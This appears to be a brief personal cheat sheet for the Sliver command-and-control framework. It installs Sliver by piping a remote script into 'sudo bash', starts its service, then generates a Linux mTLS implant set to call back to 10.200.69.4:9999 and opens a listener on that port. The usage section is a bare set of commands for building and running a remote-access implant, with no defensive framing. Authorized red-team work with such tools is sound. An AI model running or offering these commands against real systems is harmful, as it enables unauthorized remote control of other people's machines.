# Installation

```bash
curl https://sliver.sh/install | sudo bash
# recommand to install
sudo apt install mingw-w64

# check status and start
sudo systemctl status sliver
sudo systemctl start sliver
```

# Usage

```bash
# 
generate --mtls 10.200.69.4:9999 --os linux --arch amd64 --save /tmp/linux_implant

# listener
mtls --lhost 0.0.0.0 --lport 9999
```